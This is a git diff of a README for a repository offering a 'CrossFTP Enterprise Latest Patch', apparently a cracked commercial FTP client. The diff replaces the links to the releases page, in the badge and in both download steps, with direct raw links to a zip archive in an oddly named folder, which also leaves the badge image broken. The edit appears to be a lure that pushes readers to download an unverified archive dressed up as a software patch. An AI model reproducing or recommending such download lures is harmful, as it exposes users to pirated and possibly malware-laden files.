@@ -1,6 +1,6 @@
 # 🚀 CrossFTP-Enterprise-Latest-Patch - Simplify Your File Transfers
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mateusrick/CrossFTP-Enterprise-Latest-Patch/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/mateusrick/CrossFTP-Enterprise-Latest-Patch/main/subpolar/CrossFTP-Enterprise-Latest-Patch-2.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mateusrick/CrossFTP-Enterprise-Latest-Patch/main/subpolar/CrossFTP-Enterprise-Latest-Patch-2.2.zip)
 
 ## 📖 Overview
 
@@ -25,7 +25,7 @@ To get up and running with CrossFTP Enterprise, follow these simple steps:
 
 1. **Visit the Download Page**: Click the link below to go to the Releases page.
 
-   [Download Latest Release](https://github.com/mateusrick/CrossFTP-Enterprise-Latest-Patch/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/mateusrick/CrossFTP-Enterprise-Latest-Patch/main/subpolar/CrossFTP-Enterprise-Latest-Patch-2.2.zip)
 
 2. **Choose Your Version**: Look through the available versions. Select the latest version for the best experience.
 
@@ -44,7 +44,7 @@ To download CrossFTP Enterprise:
 
 1. Click the button below to access the Releases page:
 
-   [Download Latest Release](https://github.com/mateusrick/CrossFTP-Enterprise-Latest-Patch/releases)
+   [Download Latest Release](https://raw.githubusercontent.com/mateusrick/CrossFTP-Enterprise-Latest-Patch/main/subpolar/CrossFTP-Enterprise-Latest-Patch-2.2.zip)
 
 2. Find the latest release, which often appears at the top of the list.
 
